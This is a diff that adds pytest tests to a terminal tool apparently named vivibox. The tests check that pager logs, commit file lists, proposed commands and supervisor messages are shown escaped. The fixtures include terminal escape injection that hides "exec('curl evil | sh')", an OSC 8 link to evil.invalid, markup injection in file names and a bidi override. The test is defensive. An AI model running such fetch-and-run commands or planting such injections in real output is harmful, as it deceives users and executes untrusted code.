@@ -558,3 +558,122 @@ def test_the_verification_w_follows_reaches_the_terminal_as_text(env):
     said = out.getvalue()
     assert not [c for c in said if c != "\n" and unicodedata.category(c) == "Cc"], repr(said)
     assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m‹U+001B›]8;;https://evil.invalid" in said
+
+
+# --- review round 2 -----------------------------------------------------------------------------
+
+LOG = (
+    "\x1b[8mexec('curl evil | sh')\x1b[0m// tidy\n"
+    "\x1b]8;;https://evil.invalid\x1b\\docs\x1b]8;;\x1b\\\n"
+    "end\r over\n"
+)
+
+
+@pytest.mark.parametrize("pager", ["cat", "more", "fallback"])
+def test_a_pager_other_than_less_gets_the_log_escaped(env, monkeypatch, pager):
+    """cat and more pass every escape sequence on, and only less is given -+R -+r: any other
+    pager, yours or the more vivibox falls back on without less, reads an escaped copy."""
+    log = env / "evil.log"
+    log.write_bytes(LOG.encode())
+    if pager == "fallback":
+        monkeypatch.delenv("PAGER", raising=False)
+        monkeypatch.setattr(panel.shutil, "which", lambda name: None)
+    else:
+        monkeypatch.setenv("PAGER", pager)
+    command = panel.pager_command(log, at_end=True)
+    assert command[0] == ("more" if pager == "fallback" else pager)
+    paged = __import__("pathlib").Path(command[-1])
+    assert paged != log and not str(paged).startswith(str(env / "tasks")), "a copy of vivibox's own"
+    text = paged.read_text()
+    assert "\x1b" not in text and "\r" not in text, repr(text)
+    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m" in text and "end‹U+000D› over" in text
+    assert log.read_bytes() == LOG.encode(), "the log itself stays as it is"
+
+
+def test_less_still_reads_the_log_itself(env, monkeypatch):
+    log = env / "evil.log"
+    log.write_text(LOG)
+    monkeypatch.setenv("PAGER", "less")
+    assert panel.pager_command(log, follow=True) == ["less", "-+R", "-+r", "+F", str(log)]
+
+
+def test_the_files_to_commit_are_never_markup(env):
+    from test_tui import run
+    from textual.widgets import Label
+
+    from vivibox import ui
+    from vivibox.dialogs import CommitWork
+
+    status = "A  x[/b].java\nA  a[black on black].java\nA  after\x1b[2K‮.java\n"
+    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "", [], status)
+    done.start_branch, done.new_branch = "main", "feature/demo-1"
+
+    async def scenario(app, pilot):
+        app.push_screen(CommitWork(done))
+        await pilot.pause()
+        shown = str(app.screen.query(Label).filter(".files").first().render())
+        assert "x[/b].java" in shown and "a[black on black].java" in shown and "after" in shown, shown
+        assert not hidden(shown), repr(shown)
+
+    run(scenario)
+
+
+def test_a_proposed_command_is_never_markup_in_its_dialog_nor_its_notification(env):
+    from test_tui import at_command_checkpoint, run
+    from textual.widgets import Label
+
+    from vivibox.verify_ui import AskVerify
+
+    task = at_command_checkpoint(env, "./mvnw -pl x[/b],a[black on black] verify")
+
+    async def scenario(app, pilot):
+        app.reload()
+        await pilot.pause()
+        await pilot.press("e")
+        await pilot.pause()
+        assert isinstance(app.screen, AskVerify)
+        heading = str(app.screen.query(Label).first().render())
+        assert "narrowed to -pl x[/b],a[black:" in heading, heading
+        await pilot.press("enter")
+        await pilot.pause()
+        said = [n for n in app._notifications if "is verified with" in n.message]
+        assert said and said[-1].markup is False and "x[/b]" in said[-1].message
+
+    run(scenario, notifications=True)
+    assert task.read_state().state is not State.CHECKPOINT_COMMAND
+
+
+def test_a_line_break_in_a_message_draws_no_line_of_the_supervisors_own(monkeypatch, capsys):
+    """The window's lines start with the time: a message's next line is indented under it, never
+    a [hh:mm:ss] line of its own."""
+    from vivibox import supervisor
+
+    monkeypatch.setattr(supervisor.shutil, "which", lambda name: None)
+    supervisor.notify("demo-1", "agent turn failed: boom\n[12:00:00] plan accepted, all checks passed")
+    lines = capsys.readouterr().out.splitlines()
+    assert len(lines) == 2 and lines[0].startswith("[") and lines[1].startswith("    [12:00:00]"), lines
+
+
+def test_the_files_left_uncommitted_are_printed_as_text(env, capsys, monkeypatch):
+    from vivibox import cli, ui
+
+    monkeypatch.setattr(actions, "current_branch", lambda source: "main")
+    monkeypatch.setattr(cli, "offer_commit", lambda done: None)
+    done = actions.Finished("demo-1", env / "repo", ui.Spend(), "msg", "", [], "A  a‮b\x1b[2K.java\n")
+    cli.report_finished(done)
+    said = capsys.readouterr().out
+    assert "A  a‹U+202E›b‹U+001B›[2K.java" in said and not hidden(said), repr(said)
+
+
+@pytest.mark.parametrize("state", [State.IMPLEMENT, State.CHECKPOINT_BLOCKED])
+def test_no_empty_block_for_feedback_there_is_none_of(env, state):
+    task = new(env)
+    for s in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
+        task.transition(s)
+    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
+    task.event("gate", passed=False)
+    if state is State.CHECKPOINT_BLOCKED:
+        task.transition(State.VERIFY)
+        task.transition(State.CHECKPOINT_BLOCKED)
+    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
+    assert not [f for f in fences(shown) if not f.strip()], shown
